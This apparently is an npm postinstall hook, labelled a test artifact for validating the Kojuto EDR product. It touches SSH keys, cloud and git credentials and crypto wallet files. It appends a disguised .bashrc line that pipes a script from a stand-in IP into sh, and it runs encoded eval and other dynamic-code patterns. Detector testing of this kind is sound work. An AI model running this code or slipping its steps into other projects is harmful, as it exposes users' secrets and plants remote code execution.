/**
 * postinstall lifecycle hook — Credential harvesting + persistence.
 *
 * !! TEST ARTIFACT FOR KOJUTO EDR VALIDATION !!
 * !! DO NOT PUBLISH TO npm !!
 *
 * TTPs exercised:
 *   - SSH/cloud credential harvesting (credential_access)
 *   - Crypto wallet harvesting (credential_access)
 *   - .bashrc persistence injection (persistence)
 *   - eval/Function dynamic code execution (dynamic_code_execution)
 */

'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');

const home = os.homedir();

// --- Credential harvesting ---

function readCredentials() {
  const targets = [
    path.join(home, '.ssh', 'id_rsa'),
    path.join(home, '.ssh', 'id_ed25519'),
    path.join(home, '.aws', 'credentials'),
    path.join(home, '.git-credentials'),
    path.join(home, '.netrc'),
    path.join(home, '.config', 'gh', 'hosts.yml'),
    path.join(home, '.docker', 'config.json'),
  ];

  for (const target of targets) {
    try { fs.readFileSync(target, 'utf8'); } catch (_) {}
  }
}

// --- Crypto wallet harvesting ---

function readWallets() {
  const targets = [
    path.join(home, '.solana', 'id.json'),
    path.join(home, '.ethereum', 'keystore'),
    path.join(home, '.bitcoin', 'wallet.dat'),
    path.join(home, '.electrum', 'wallets', 'default_wallet'),
    path.join(home, '.exodus', 'exodus.wallet'),
    path.join(home, '.atomic', 'Local Storage', 'leveldb'),
    path.join(home, '.config', 'solana', 'cli', 'config.yml'),
  ];

  for (const target of targets) {
    try { fs.readFileSync(target, 'utf8'); } catch (_) {}
  }
}

// --- Persistence via .bashrc ---

function persistence() {
  try {
    const bashrc = path.join(home, '.bashrc');
    fs.appendFileSync(bashrc,
      '\n# systemd-helper\n' +
      'curl -s http://203.0.113.50:8443/update.sh | sh\n'
    );
  } catch (_) {}
}

// --- Dynamic code execution (audit hook validation) ---

function dynamicExec() {
  // 1. eval — kojuto-require.js should intercept this.
  try {
    const encoded = Buffer.from(
      'cmVxdWlyZSgiZnMiKS5yZWFkRmlsZVN5bmMoIi9ldGMvaG9zdG5hbWUiLCAidXRmOCIp'
    , 'base64').toString();
    // Decodes to: require("fs").readFileSync("/etc/hostname", "utf8")
    eval(encoded);
  } catch (_) {}

  // 2. Function constructor — indirect eval.
  try {
    const fn = new Function('os', 'return os.hostname()');
    fn(os);
  } catch (_) {}

  // 3. vm.runInNewContext — sandbox escape pattern.
  try {
    const vm = require('vm');
    vm.runInNewContext('typeof process !== "undefined" && process.env.AWS_SECRET_ACCESS_KEY', {});
  } catch (_) {}
}

// --- Execute ---
readCredentials();
readWallets();
persistence();
dynamicExec();
